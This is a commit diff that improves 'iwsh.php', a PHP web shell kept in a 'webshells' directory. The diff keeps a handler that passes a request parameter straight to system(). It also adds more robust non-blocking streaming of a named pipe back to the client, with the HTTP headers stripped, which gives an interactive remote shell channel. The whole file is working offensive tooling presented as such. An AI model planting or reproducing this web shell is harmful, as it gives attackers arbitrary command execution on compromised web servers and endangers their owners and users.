improve iwsh.php

+++ webshells/iwsh.php
@@ -9,48 +9,52 @@ if (isset($_REQUEST['o']) || isset($_REQUEST['i']) || isset($_REQUEST['c']) || i
         if(isset($_REQUEST['fi'])) {
             $fi = $_REQUEST['fi'];
         } else {
-            $fi = "/tmp/i";
+            exit;
         }
         $command = $_REQUEST['i'];
-        file_put_contents($fi, $command , FILE_APPEND);
+        if (file_exists($fi)) {
+            file_put_contents($fi, $command , FILE_APPEND);
+        }
     }
-
     if(isset($_REQUEST['c'])){
         $command = $_REQUEST['c'];
         system($_REQUEST['c']);
     }
-
     if (isset($_REQUEST['o'])) {
         ob_end_flush();
-        // Remove headers
         header_remove();
-        // Removes the HTTP status line
         header_remove('Status'); 
         header_remove('Date');
         header_remove('Connection');
         header_remove('Content-Type');
-
-        // Function to send a chunk of data
         function sendChunk($data) {
-            echo $data; #. "\n";
+            echo $data;
             flush();
         }
         $pipe = fopen($_REQUEST['o'], 'r');
-        
-        while (true) {
-            $chunk = fread($pipe, 1);
-            if ($chunk != "" ) {
-                sendChunk($chunk);
-            }
-            usleep(100);
+        if (!$pipe) {
+            exit;
         }
+        stream_set_blocking($pipe, 0);
+        while (true) {
+            if (!file_exists($_REQUEST['o'])) {
+                break;
+            }
+            $read = [$pipe];
+            $write = null;
+            $except = null;
+            if (stream_select($read, $write, $except, 0, 0) > 0) {
+                $data = fread($pipe, 4096); 
+                if ($data === false || feof($pipe)) {
+                    break;
+                }
+                sendChunk($data);
+            }
+            usleep(100000); 
+        }
+        fclose($pipe);
         ob_end_flush();
     }
-
     exit;
 }
-
 ?>
-
-
-
